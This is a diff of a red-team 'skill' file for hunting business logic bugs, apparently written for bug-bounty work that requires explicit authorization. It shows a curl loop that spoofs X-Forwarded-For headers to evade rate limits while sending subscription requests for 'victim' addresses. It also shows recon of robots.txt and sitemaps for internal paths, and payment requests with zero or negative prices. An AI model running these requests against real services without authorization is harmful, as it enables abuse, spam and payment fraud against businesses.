@@ -4,9 +4,40 @@ description: Hunting skill for business logic vulnerabilities. Built from 12 pub
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [business-logic, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [business-logic, hunt, redteam]
+  category: redteam
 ---
+
+## When to Use
+
+- Hunting business logic — heavy emphasis on financial-impact-demonstrated cases.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `python3`, `shodan`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Rotate X-Forwarded-For to bypass IP rate limiting
+for i in $(seq 1 100); do
+  curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/api/subscribe \
+    -H "X-Forwarded-For: 10.0.0.$i" \
+    -H "X-Real-IP: 10.0.0.$i" \
+    -H "Content-Type: application/json" \
+    -d '{"email":"victim+'"$i"'@example.com"}' \
+    -o /dev/null -w "%{http_code}\n"
+done
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -99,7 +130,7 @@ curl --max-time 30 --connect-timeout 10 -X POST https://target.com/payment/callb
 **Unauthenticated internal page discovery:**
 ```bash
 # Check robots.txt and sitemap for internal paths
-curl --max-time 30 --connect-timeout 10 -s https://target.com/robots.txt | grep -iE "(disallow|allow)" 
+curl --max-time 30 --connect-timeout 10 -s https://target.com/robots.txt | grep -iE "(disallow|allow)"
 curl --max-time 30 --connect-timeout 10 -s https://target.com/sitemap.xml | grep -iE "(employee|internal|staff|summit|admin)"
 
 # Grep JS bundles for internal paths
@@ -230,6 +261,17 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 ---
 
+## Pitfalls
+
+- **Assuming business logic bugs are low-impact** — price manipulation, coupon abuse, and refund fraud are among the highest-paid bugs. Don't dismiss them as "just logic."
+- **Testing only happy path** — the bug is in the edge case. Test: negative quantities, zero prices, race conditions on redemptions, expired coupons, concurrent requests.
+- **Single-step testing** — business logic bugs often require multi-step sequences (add to cart + apply coupon + change quantity + checkout). Test the full flow.
+- **Ignoring error handling** — 500 errors on edge cases often reveal unhandled states that lead to inconsistent data (partial order, double charge, free items).
+- **Not comparing frontend vs API** — the frontend may enforce limits that the API doesn't. Test all constraints via direct API calls.
+- **Currency/rounding issues** — fractional currency handling (e.g., 0.001 USD) can produce rounding errors that accumulate across bulk operations.
+
+---
+
 ## Verification
 
 Run this self-test to confirm business logic readiness:
@@ -250,18 +292,6 @@ Run this self-test to confirm business logic readiness:
    ```
 
 All 3 tests verify business logic probing readiness.
-
----
-
-## Pitfalls
-
-- **Assuming business logic bugs are low-impact** — price manipulation, coupon abuse, and refund fraud are among the highest-paid bugs. Don't dismiss them as "just logic."
-- **Testing only happy path** — the bug is in the edge case. Test: negative quantities, zero prices, race conditions on redemptions, expired coupons, concurrent requests.
-- **Single-step testing** — business logic bugs often require multi-step sequences (add to cart + apply coupon + change quantity + checkout). Test the full flow.
-- **Ignoring error handling** — 500 errors on edge cases often reveal unhandled states that lead to inconsistent data (partial order, double charge, free items).
-- **Not comparing frontend vs API** — the frontend may enforce limits that the API doesn't. Test all constraints via direct API calls.
-- **Currency/rounding issues** — fractional currency handling (e.g., 0.001 USD) can produce rounding errors that accumulate across bulk operations.
-
 
 ---
 
@@ -289,7 +319,7 @@ curl --max-time 30 --connect-timeout 10 -sk -X POST "https://api.target.com/chec
   -H "Content-Type: application/json" \
   -d '{"items":[{"id":"premium_product","quantity":1,"price":0}]}'
 
-# 3. Test negative prices  
+# 3. Test negative prices
 curl --max-time 30 --connect-timeout 10 -sk -X POST "https://api.target.com/api/payments/create" \
   -H "Authorization: Bearer $TOKEN" \
   -d '{"items":[{"id":"plan","quantity":1,"price":-100}]}'
